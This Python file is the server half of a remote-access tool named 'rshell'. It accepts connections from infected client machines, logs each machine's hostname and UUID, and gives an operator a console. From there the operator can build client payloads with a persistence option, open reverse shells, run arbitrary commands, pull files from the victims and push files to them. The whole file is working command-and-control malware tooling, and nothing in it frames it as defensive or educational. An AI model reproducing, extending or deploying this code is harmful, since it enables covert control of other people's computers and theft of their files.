import os
import readline
import sys
import time
import socket
import threading
from colorama import Fore
from difflib import get_close_matches

import server.output as output
import server.database as database
import server.build as builder

## Variables
HOST_IP = '127.0.0.1'
HOST_Port = 1024
LOCAL_DATABASE = 'database.db'

#main
def main():
    db = database.data(LOCAL_DATABASE)
    s = server(HOST_IP,HOST_Port,db)
    s.start()
class server():
    def __init__(self,host,port,db):
        self.database = db
        self.host = host
        self.port = port
        self.prompt = ''
        self.clients = []
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('0.0.0.0', self.port))
        self.cur = -1
        self.commands = {
            'help' : {
                'method': self.help,
                'usage': 'help <command>',
                'description': 'returns info of command [use: help <command>]'},
            'build' : {
                'method': self.build,
                'usage': 'build <name> <options>',
                'description': 'builds client application [options: -persistence]'},
            'clear' : {
                'method': clear,
                'usage': 'clear',
                'description': 'clears console'},
            'clients' : {
                'method': self.listclients,
                'usage': 'clients <option>',
                'description': 'print list of clients [options: online]'},
            'search' : {
                'method': self.search,
                'usage': 'search <hostname/nickname>',
                'description': 'searches for clients with relevant hostname or nickname'},
            'info' : {
                'method': self.info,
                'usage': 'info <client id>',
                'description': 'shows client information'},
            'nickname' : {
                'method': self.nickname,
                'usage': 'nickname <client id> <nickname>',
                'description': 'sets the nickname for a client (organization and search)'},
            'connect' : {
                'method': self.connect,
                'usage': 'connect <client id>',
                'description': 'reverse shell to client'},
            'get' : {
                'method': self.get,
                'usage': 'get <file>',
                'description': 'transfers file from client to host'},
            'put' : {
                'method': self.put,
                'usage': 'put <file>',
                'description': 'transfers file from host to client'},
            'end' : {
                'method': self.endconn,
                'usage': 'end',
                'description': 'ends current reverse shell'},
            'remove' : {
                'method': self.remove,
                'usage': 'remove <client id>',
                'description': 'removes client from server (stays installed on client)'},
            'kill' : {
                'method': self.kill,
                'usage': 'kill',
                'description': 'removes current reverse shell from server and client computer'},
            'exit' : {
                'method': self.exit,
                'usage': 'exit',
                'description': 'exits rshell (keeps clients alive)'}
        }

    def help(self,type='none'):
        if type == 'none':
            output.echo('{:<15}{:<20}'.format('Command','Description'),color='MAGENTA')
            for command,value in self.commands.items():
                output.echo('{:<15}{:<20}'.format(command,value['description']),color='WHITE',newline='LAST')
        else:
            if type.lower() in self.commands:
                description = self.commands[type.lower()]['description']
                usage = self.commands[type.lower()]['usage']
                output.echo(f'Command - {type.lower()}\nDescription - {description}\nUsage - {usage}',color='WHITE')
            else:
                output.echo('command does not exist',color='WHITE',type='WARNING')
    def build(self,options='none'):
        if options == 'none':
            status = builder.generate(hostIP=HOST_IP,hostPORT=HOST_Port)
            if status == True:
                output.echo('client generated',color='WHITE',type='SUCCESS')
            else:
                output.echo('client failed to generated',color='WHITE',type='WARNING')
    def listener(self):
        self.s.listen(100)
        while True:
            try:
                s = self.s.accept()
                newcli = list(s)
                #get comouter name
                hostname = newcli[0].recv(1024).decode()
                # set nickname
                nickname = 'None'
                #get uuid
                uuid = newcli[0].recv(1024).decode()
                info = {'hostname':hostname,'nickname':nickname,'uuid':uuid}
                newcli.append(info)
                #if cant find uuid then dont add client
                if uuid == '':
                    pass
                #determine if exists in list already if it does replace it if it doesnt create new and print message
                elif(pos := self.findcli('uuid',uuid)) != -1:
                    #set nickname since it exists and update database information with ip and computer name
                    self.database.update(newcli)
                    newcli[2]['nickname'] = self.clients[pos][2]['nickname']
                    self.clients[pos] = newcli
                else:
                    print('')
                    output.echo(f' new client {newcli[1][0]}({hostname})',color='WHITE',type='ADDED')
                    print(self.prompt, end='', flush=True)
                    #add new client to lists and import to database
                    self.clients.append(newcli)
                    self.database.new(newcli)
            except:
                pass

    def connect(self,cli):
        c = int(cli)
        #check if already connected
        if self.cur != -1:
            output.echo('already established connection',color='WHITE',type='WARNING')
        #check if client exists
        elif c > len(self.clients)-1 or c < 0:
            output.echo('invalid client',color='WHITE',type='WARNING')
        #check if its online before connecting
        elif not self.isOnline(self.clients[c][0]):
            output.echo('client not online',color='WHITE',type='WARNING')
        else:
            self.cur = c
            self.prompt = Fore.MAGENTA + f'[client {c}]' + Fore.WHITE + 'rshell> '

    def remove(self,cli):
        c = int(cli)
        if c > len(self.clients)-1 or c < 0:
            output.echo('invalid client',color='WHITE',type='WARNING')
        else:
            self.database.remove(self.clients[c])
            self.clients.pop(c)
            output.echo('client removed',color='WHITE',type='SUCCESS')

    def kill(self,cmd="kill"):
        #check if not connected
        if self.cur == -1:
            output.echo('no connection established',color='WHITE',type='WARNING')
            return
        else:
            killed = False
            while True:
                inp = input(Fore.RED + '\n[!] '+ Fore.WHITE +'are you sure you want to kill connection [Y/N]: ')
                if inp.lower() == 'y':
                    try:
                        self.clients[self.cur][0].send('kill'.encode())
                        killed = True
                    except:
                        self.endconn()
                    break
                elif inp.lower() == 'n':
                    output.echo('aborted',color='WHITE',type='WARNING')
                    break
            if killed == True:
                self.database.remove(self.clients[self.cur])
                self.clients.pop(self.cur)
                self.cur = -1
                self.prompt = Fore.WHITE + 'rshell> '
                output.echo('connection killed',color='WHITE',type='SUCCESS')

    def endconn(self,action=""):
        #check if not connected
        if self.cur == -1:
            output.echo('no connection established',color='WHITE',type='WARNING')
            return
        else:
            self.cur = -1
            self.prompt = Fore.WHITE + 'rshell> '
            output.echo('connection ended',color='WHITE',type='SUCCESS')

    def get(self,fileName):
        #check if not connected
        if self.cur == -1:
            output.echo('no connection established',color='WHITE',type='WARNING')
            return
        else:
            file = open(fileName, "wb")
            command = "get " + fileName
            self.clients[self.cur][0].send(command.encode())
            data = b""
            while True:
                buffer = self.clients[self.cur][0].recv(1024)
                if buffer == b"<!EOF!>":
                    break
                if buffer == b"<!Failed!>":
                    file.close()
                    if os.path.exists(fileName):
                        os.remove(fileName)
                    output.echo('file transfer failed',color='WHITE',type='WARNING')
                    return
                else:
                    data += buffer
            file.write(data)
            file.close()
            output.echo('file transfer complete',color='WHITE',type='SUCCESS')

    def put(self,fileName):
        #check if not connected
        if self.cur == -1:
            output.echo('no connection established',color='WHITE',type='WARNING')
            return
        else:
            try:
                file = open(fileName, "rb")
                data = file.read()
            except:
                output.echo('file not found',color='WHITE',type='WARNING')
                return
            try:
                command = "put " + fileName
                self.clients[self.cur][0].send(command.encode())
                time.sleep(.1)
                self.clients[self.cur][0].sendall(data)
                time.sleep(.1)
                self.clients[self.cur][0].send(b"<!EOF!>")
            except:
                self.clients[self.cur][0].send(b"<!Failed!>")
    def sendCommand(self,cmd):
        #check if not connected
        if self.cur == -1:
            output.echo('no connection established',color='WHITE',type='WARNING')
            return
        else:
            try:
                self.clients[self.cur][0].send(cmd.encode())
                cmd_buffer = cmd
                cmd, _, action = cmd_buffer.partition(' ')
                #receive input from client and print
                msg_size = int(self.clients[self.cur][0].recv(1024).decode())
                time.sleep(.001)
                print(self.clients[self.cur][0].recv(msg_size).decode())
            except:
                self.endconn()

    def isOnline(self,client):
        #send connectionstatus twice to see if itll receive without error
        try:
            client.send('connectionstatus'.encode())
            time.sleep(.001)
            client.send('connectionstatus'.encode())
            time.sleep(.001)
            return True
        except:
            return False

    def search(self,action):
        results = []
        for i in range(len(self.clients)):
            if len(get_close_matches(action, [self.clients[i][2]['hostname']])) > 0:
                results.append(i)
            elif len(get_close_matches(action, [self.clients[i][2]['nickname']])) > 0:
                results.append(i)
        if len(results) == 0:
            output.echo('no search results',color='WHITE',type='WARNING')
        else:
            output.echo('{:<5}{:<20}{:<20}{:<20}{:<8}'.format('id','hostname','nickname','ip-address','status'),color='MAGENTA')
            for x in results:
                client = self.clients[x]
                if self.isOnline(client[0]):
                    output.echo('{:<5}{:<20}{:<20}{:<20}{:<8}'.format(x,client[2]['hostname'],client[2]['nickname'],client[1][0],Fore.GREEN + 'Online'),color='WHITE',newline='LAST')
                else:
                    output.echo('{:<5}{:<20}{:<20}{:<20}{:<8}'.format(x,client[2]['hostname'],client[2]['nickname'],client[1][0],Fore.RED + 'Offline'),color='WHITE',newline='LAST')

    def nickname(self,action):
        x = action.split()
        if len(x) == 2:
            try:
                c = int(x[0])
                if c > len(self.clients)-1:
                        output.echo('invalid client',color='WHITE',type='WARNING')
                else:
                    self.clients[c][2]['nickname'] = x[1]
                    self.database.setnick(self.clients[c])
                    output.echo('nickname set',color='WHITE',type='SUCCESS')
            except:
                output.echo('invalid parameters',color='WHITE',type='WARNING')
        else:
            output.echo(' invalid parameters',color='WHITE',type='WARNING')

    def info(self,cli):
        c = int(cli)
        #check if client exists
        if c > len(self.clients)-1:
                output.echo(' invalid client',color='WHITE',type='WARNING')
        else:
            client = self.clients[c]
            output.echo(f'[client {c}]',color='MAGENTA')
            if self.isOnline(client[0]):
                text = Fore.GREEN + 'Online'
                output.echo(f'status: {text}',color='WHITE',newline='LAST')
            else:
                text = Fore.RED + 'Offline'
                output.echo(f'status: {text}','WHITE',newline='LAST')
            output.echo(f'ip address:  {client[1][0]}',color='WHITE',newline='LAST')
            for key, value in client[2].items():
                output.echo(f'{key}:  {value}',color='WHITE',newline='LAST')

    def listclients(self,type='none'):
        count = 0
        output.echo('{:<5}{:<20}{:<20}{:<20}{:<8}'.format('id','hostname','nickname','ip-address','status'),color='MAGENTA')
        if type.lower() == 'online':
            for item in self.clients:
                if self.isOnline(item[0]):
                    output.echo('{:<5}{:<20}{:<20}{:<20}{:<8}'.format(count,item[2]['hostname'],item[2]['nickname'],item[1][0],Fore.GREEN + 'Online'),color='WHITE',newline='LAST')
                count += 1
        else:
            for item in self.clients:
                if self.isOnline(item[0]):
                    output.echo('{:<5}{:<20}{:<20}{:<20}{:<8}'.format(count,item[2]['hostname'],item[2]['nickname'],item[1][0],Fore.GREEN + 'Online'),color='WHITE',newline='LAST')
                else:
                    output.echo('{:<5}{:<20}{:<20}{:<20}{:<8}'.format(count,item[2]['hostname'],item[2]['nickname'],item[1][0],Fore.RED + 'Offline'),color='WHITE',newline='LAST')
                count += 1

    def findcli(self,key,val):
        count = 0
        for i in self.clients:
            if i[2][key] == val:
                return count
            count += 1
        return -1

    def start(self):
        #populate clients from the database
        self.clients = self.database.populate()
        #start listening thread to listen for clients in background
        self.listenThread = threading.Thread(target=self.listener)
        self.listenThread.daemon = True
        self.listenThread.start()
        self.prompt = Fore.WHITE + 'rshell> '
        while True:
            try:
                cmd = input(self.prompt)
                cmd_buffer = cmd
                cmd, _, action = cmd_buffer.partition(' ')
                if cmd in self.commands:
                    method = self.commands[cmd]['method']
                    try:
                        method(action) if len(action) else method()
                    except Exception as e1:
                        output.echo(str(e1),color='WHITE',type='WARNING')
                elif self.cur != -1:
                    self.sendCommand(cmd + ' ' + action)
                else:
                    output.echo('command does not exist',color='WHITE',type='WARNING')
            except KeyboardInterrupt:
                    print('')
                    self.exit()
    ##Exit Handler
    def exit(self):
        self.s.close()
        output.echo('exiting rshell', color='WHITE',type='EXIT')
        sys.exit()

##Clear console function
def clear():
    from os import system, name
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')
    output.banner()

if __name__ == "__main__":
    clear()
    main()